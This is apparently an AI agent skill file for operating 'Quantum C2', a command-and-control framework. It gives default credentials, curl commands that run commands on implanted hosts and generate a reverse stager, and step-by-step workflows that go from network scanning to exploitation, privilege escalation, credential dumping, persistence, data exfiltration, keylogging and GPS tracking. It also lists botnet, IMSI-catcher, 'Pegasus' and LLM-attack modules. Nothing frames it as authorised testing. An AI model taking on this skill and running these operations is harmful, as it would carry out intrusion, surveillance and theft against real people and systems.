---
name: quantum-c2-operator
description: >
  Comprehensive Quantum C2 framework operator skill. Use when the user needs to operate, manage, configure, or understand the Quantum C2 cyber operations framework. Covers backend API interaction, frontend navigation, system configuration, deployment management, health monitoring, and operational workflows. Triggers on: "operate Quantum C2", "manage C2", "deploy Quantum", "configure Quantum C2", "check Quantum status", "run Quantum C2", "API call Quantum", "Quantum C2 operations".
---

# Quantum C2 Operator Skill

Master the Quantum C2 framework for cyber operations. This skill provides the knowledge to operate all aspects of the framework including backend APIs, frontend interface, deployment, and configuration.

## Framework Overview

Quantum C2 v5.0.1 is an enterprise-grade command-and-control framework with:
- **Backend**: FastAPI (Python 3.12+) on port 8000
- **Frontend**: React 18 + Vite on port 3000
- **Database**: SQLite (dev) / PostgreSQL (prod)
- **Message Queue**: Redis
- **95+ API routers** covering recon, exploitation, post-exploitation, AI, deception, evasion

### Quick Access URLs
| Service | URL |
|---------|-----|
| Backend API | http://localhost:8000 |
| API Docs (Swagger) | http://localhost:8000/docs |
| API Docs (ReDoc) | http://localhost:8000/redoc |
| Health Check | http://localhost:8000/health |
| Frontend Dashboard | http://localhost:3000 |
| Sales Portal | http://localhost:8000/sales-portal |

## Default Credentials
- Username: `admin`
- Password: `cyber-warfare-7`
- Always change after first login

## Authentication

All API calls require JWT Bearer token:
```bash
# Login to get token
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"cyber-warfare-7"}'

# Use token
curl http://localhost:8000/api/dashboard/ \
  -H "Authorization: Bearer <token>"
```

## Essential API Endpoints

### System & Health
```bash
GET  /api/health                          # Health check
GET  /api/system/status                   # System resources
GET  /api/status                          # Framework status
GET  /api/dashboard/                      # Dashboard stats
GET  /api/telemetry/                      # Live telemetry
```

### Sessions (C2 Implants)
```bash
GET    /api/sessions/                     # List all sessions
POST   /api/sessions/                     # Create session
GET    /api/sessions/{id}                 # Session details
POST   /api/sessions/{id}/execute         # Execute command
POST   /api/sessions/{id}/screenshot      # Capture screenshot
POST   /api/sessions/{id}/keylogger/{on|off}
GET    /api/sessions/{id}/files/download/{path}
WS     /api/sessions/ws/{session_id}      # Real-time interaction
WS     /api/sessions/ws/monitor           # Multi-session monitor
```

### Listeners (C2 Channels)
```bash
GET    /api/listeners/                    # List listeners
POST   /api/listeners/                    # Create listener
POST   /api/listeners/{id}/start          # Start listener
POST   /api/listeners/{id}/stop           # Stop listener
DELETE /api/listeners/{id}                # Remove listener
```

### Network & Recon
```bash
POST   /api/network/                      # nmap scan
GET    /api/network/scans/{id}            # Scan results
GET    /api/hosts/                        # Host inventory
GET    /api/services/                     # Service inventory
GET    /api/recon/domain                  # Domain recon
POST   /api/recon/domain                  # Domain scan
GET    /api/osint/                        # OSINT search
GET    /api/vulnerabilities/              # Vulnerability list
```

### Exploitation
```bash
GET    /api/exploits/                     # Exploit catalog
POST   /api/exploits/run                  # Deploy exploit
POST   /api/exploits/payload/generate     # Generate payload
GET    /api/payloads/                     # Payload list
GET    /api/payloads/{id}/download        # Download payload
POST   /api/fuzzing/                       # Start fuzzing
```

### Post-Exploitation
```bash
POST   /api/postex/full-lifecycle         # Full postex chain
POST   /api/postex/privilege-escalation   # Priv esc
POST   /api/postex/credential-dump        # Credential dump
POST   /api/postex/persistence            # Persistence
POST   /api/postex/exfiltration           # Data exfil
POST   /api/postex/surveillance           # Surveillance
```

### AI & Chatbot
```bash
GET    /api/chatbot/providers             # List AI providers
POST   /api/chatbot/providers/switch      # Switch provider
POST   /api/chatbot/                      # Chat with AI
GET    /api/chatbot/models                # List models
POST   /api/chatbot/config                # Update config
GET    /api/chatbot/history/{conv_id}     # Chat history
```

### Device Control
```bash
GET    /api/devices/                      # List devices
POST   /api/devices/                      # Register device
GET    /api/devices/{id}                  # Device details
POST   /api/devices/{id}/command          # Execute command
POST   /api/devices/{id}/screenshot       # Capture screen
POST   /api/devices/{id}/keylogger/{on|off}
POST   /api/devices/{id}/gps              # GPS location
WS     /api/devices/ws/{id}              # Real-time control
```

### FORCED ENTRY
```bash
GET    /api/forced-entry/config           # Configuration
GET    /api/forced-entry/deception/assets # Deception fleet
POST   /api/forced-entry/deception/assets # Create asset
POST   /api/forced-entry/deception/assets/seed
GET    /api/forced-entry/evasion/techniques
POST   /api/forced-entry/triggers/seed
GET    /api/forced-entry/pegasus/operations
POST   /api/forced-entry/workflows/seed
POST   /api/forced-entry/simulate/attack
GET    /api/forced-entry/analytics/summary
```

### Credentials & Vault
```bash
GET    /api/credentials/                  # Credential list
POST   /api/credentials/                  # Store credential
GET    /api/vault/                        # Vault status
POST   /api/vault/{id}/unlock             # Unlock vault
```

### Reports & Audit
```bash
GET    /api/reports/                      # Report list
POST   /api/reports/generate              # Generate report
GET    /api/audit/                        # Audit log
GET    /api/logs/                         # System logs
```

## Configuration Management

### Settings
```bash
GET    /api/settings/                     # Current settings
PUT    /api/settings/                      # Update settings
```

### AI Configuration
```bash
POST   /api/chatbot/api-key/set           # Set provider API key
GET    /api/chatbot/api-key/status        # Key status
POST   /api/chatbot/rotate-key            # Rotate Agnes key
```

### Database
- Dev: SQLite at `backend/quantum_c2.db`
- Prod: PostgreSQL via docker-compose
- Migrations: `bash scripts/setup-database.sh`

## Deployment Commands

### Start Development
```bash
# Backend
cd backend
pip install -r requirements.txt
python -m app.main

# Frontend (new terminal)
cd frontend
npm install
npm run dev
```

### Docker Deployment
```bash
docker-compose up -d
docker-compose ps
docker-compose logs -f backend
```

### Automated Deployment
```bash
# Hetzner (recommended)
HETZNER_TOKEN=token ./scripts/deploy-all.sh hetzner cx22 nbg1 c2.yourdomain.com

# Manual (existing server)
./scripts/deploy-all.sh manual 198.51.100.42 c2.yourdomain.com
```

## Operational Workflows

### 1. Reconnaissance to Exploitation
```
1. Scan target: POST /api/network/ {"target": "192.168.1.0/24", "scan_type": "quick"}
2. Enumerate vulns: GET /api/vulnerabilities/?target=<ip>
3. Select exploit: POST /api/exploits/run {"exploit_name": "force_entry", "target": "<ip>"}
4. Generate payload: POST /api/exploits/payload/generate {"exploit_name": "...", "platform": "linux"}
5. Start listener: POST /api/listeners/ {"port": 443, "protocol": "https"}
6. Execute implant: Run payload against target
7. Monitor session: WS /api/sessions/ws/{session_id}
```

### 2. Post-Exploitation Chain
```
1. Privilege escalation: POST /api/postex/privilege-escalation
2. Credential dump: POST /api/postex/credential-dump
3. Persistence: POST /api/postex/persistence
4. Data exfiltration: POST /api/postex/exfiltration
5. Cleanup: POST /api/postex/cleanup
```

### 3. AI-Assisted Operations
```
1. Query AI: POST /api/chatbot/ {"message": "Scan 192.168.1.0/24 for vulnerabilities"}
2. AI executes tools via _execute_tool()
3. Review results in dashboard
```

### 4. Deception Operations
```
1. Seed assets: POST /api/forced-entry/deception/assets/seed
2. Seed triggers: POST /api/forced-entry/triggers/seed
3. Simulate attack: POST /api/forced-entry/simulate/attack?attack_type=brute_force&source_ip=...
4. Monitor: GET /api/forced-entry/events
```

## Common Operations Cheat Sheet

### Quick Health Check
```bash
curl http://localhost:8000/health
curl http://localhost:8000/api/dashboard/
```

### Get All Active Sessions
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/sessions/
```

### Execute Command on Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'
```

### List Listeners
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/listeners/
```

### Generate Stager
```bash
curl -X POST http://localhost:8000/api/sessions/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"stager_type":"python","platform":"linux","lhost":"10.0.0.1","lport":443}'
```

## Troubleshooting

### Backend Won't Start
```bash
# Check dependencies
pip install -r backend/requirements.txt

# Check database
ls backend/quantum_c2.db

# Check ports
netstat -ano | findstr :8000
netstat -ano | findstr :3000
```

### Frontend Won't Connect
```bash
# Verify backend is running
curl http://localhost:8000/health

# Check CORS settings
# Ensure FRONTEND_URL in .env matches dev server
```

### Session Not Appearing
```bash
# Check listeners are running
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/listeners/

# Check implant logs
tail -f backend/data/implant_sessions/*.log
```

## Key Directories
| Path | Purpose |
|------|---------|
| `backend/app/routers/` | All API route modules |
| `backend/app/modules/` | Core business logic modules |
| `backend/app/models/` | SQLAlchemy ORM models |
| `backend/data/` | Runtime data (sessions, payloads, logs) |
| `backend/configs/.env` | Environment configuration |
| `frontend/src/pages/` | All React page components |
| `frontend/src/components/` | Shared UI components |
| `scripts/` | Deployment and utility scripts |

## Module Quick Reference

### Reconnaissance Modules
- `recon_domain.py` — Domain intelligence
- `recon_people.py` — People OSINT
- `osint_api.py` — Multi-source OSINT
- `netmapper.py` — Network mapping
- `cve_feed.py` — CVE database

### Exploitation Modules
- `exploits.py` — Exploit catalog & deployment
- `exploit_embedding.py` — Steganographic embedding
- `exploit_crypto.py` — Cryptographic utilities
- `brute_force.py` — Multi-service brute force
- `fuzzing.py` / `ai_fuzzer.py` — Fuzzing engines
- `protocol_exploit.py` — Protocol attacks

### Post-Exploitation Modules
- `sessions.py` — Session management (core)
- `postex.py` — Post-exploitation toolkit
- `postex_automation.py` — Automated postex
- `credentials.py` — Credential management
- `keylogger.py` — Keylogging

### AI Modules
- `chatbot.py` — AI chatbot with tools
- `ai_fuzzer.py` — AI-guided fuzzing
- `ai_sandbox.py` — AI evaluation
- `ai_training.py` — Model training
- `llm_attack.py` — LLM attacks

### Stealth & Evasion
- `anonymity.py` — Tor & anonymity
- `network_stealth.py` — Traffic evasion
- `dnscrypt.py` — Encrypted DNS
- `forced_entry.py` — Deception & Pegasus ops

### Communication
- `listeners.py` — C2 channel listeners
- `botnet.py` — Botnet management
- `wireless.py` — Wireless attacks
- `imsi_catcher.py` — Cellular intel
